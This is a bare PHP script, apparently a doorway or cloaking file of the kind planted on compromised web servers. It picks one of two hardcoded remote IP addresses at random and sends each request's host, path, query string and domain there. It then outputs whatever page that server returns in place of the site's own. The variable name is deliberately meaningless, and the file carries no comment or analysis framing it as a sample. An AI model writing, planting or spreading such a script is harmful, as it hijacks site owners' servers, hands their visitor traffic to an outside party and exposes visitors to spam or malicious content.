<?php
set_time_limit(0);

header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$Percent = rand(0,100);
if($Percent<60)
$asd11as12314 = "http://180.97.220.55/l/liushui/";
else
$asd11as12314 = "http://180.97.220.64/l/zhengming/"; 


$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Cf=file_get_contents($asd11as12314."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Cf;
die();
?>